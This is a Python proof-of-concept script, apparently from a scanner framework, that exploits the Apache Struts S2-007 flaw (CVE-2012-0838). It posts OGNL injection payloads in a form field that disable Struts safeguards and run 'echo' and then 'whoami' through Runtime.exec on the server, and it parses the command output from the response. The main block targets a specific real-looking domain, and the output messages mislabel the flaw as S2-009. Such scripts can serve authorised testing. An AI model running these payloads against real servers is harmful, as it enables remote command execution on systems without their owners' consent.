#!/usr/bin/env python3

'''
name: S2-007漏洞,又名CVE-2012-0838漏洞
description: S2-007漏洞可执行任意命令
'''

import re
import sys
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_007_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self.check_payload = {
                'name': "1",
                'email': "7777777@qq.com",
                'age': '''\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(''' + '\'' +'echo ' + self.capta + '\'' + ''').getInputStream())) + \''''
               }
        self.cmd_payload = {
                'name': "1",
                'email': "7777777@qq.com",
                'age': '''\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + \''''
               }
    
    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if '.action' not in self.url:
                self.url = self.url + '/user.action'
            check_req = request.post(self.url, data = self.check_payload)
            if self.capta in check_req.text and check_req.status_code == 200:
                cmd_req = request.post(self.url, data = self.cmd_payload)
                cmd_str = re.sub('\n', '', cmd_req.text)
                result = re.findall('''<input type="text" name="age" value="(.*?)" id="user_age"/></td>''', cmd_str)
                print ('存在S2-009漏洞,执行whoami命令成功，执行结果是:', result)
                return True
            else:
                #print('不存在S2-009漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_007 = S2_007_BaseVerify('http://jsfw.kydls.com')
    S2_007.run()